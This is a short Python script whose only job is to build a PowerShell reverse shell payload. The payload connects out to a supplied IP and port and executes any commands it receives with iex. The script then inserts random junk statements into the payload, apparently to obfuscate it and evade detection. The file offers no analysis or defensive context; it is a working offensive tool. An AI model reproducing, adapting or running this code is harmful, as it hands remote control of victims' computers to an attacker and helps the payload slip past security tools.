import random

def generate_reverse_shell(ip, port):
    # Base PowerShell reverse shell script
    shell_code = f"""
    $client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush() }}
    $client.Close()
    """

    # List of junk code statements
    junk_code = [
        "$dummyVariable = 'This is a dummy variable';",
        "Write-Output 'This is a junk code statement';",
        "Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5);",
        # Add more junk code statements as needed
    ]

    # Insert junk code randomly throughout the script
    lines = shell_code.strip().splitlines()
    for _ in range(random.randint(3, 5)):  # Insert 3 to 5 junk code lines
        index = random.randint(1, len(lines) - 1)  # Avoid inserting at the first line
        lines.insert(index, random.choice(junk_code))

    # Join the lines back into the final script
    shell_code_with_junk = "\n".join(lines)
    
    return shell_code_with_junk
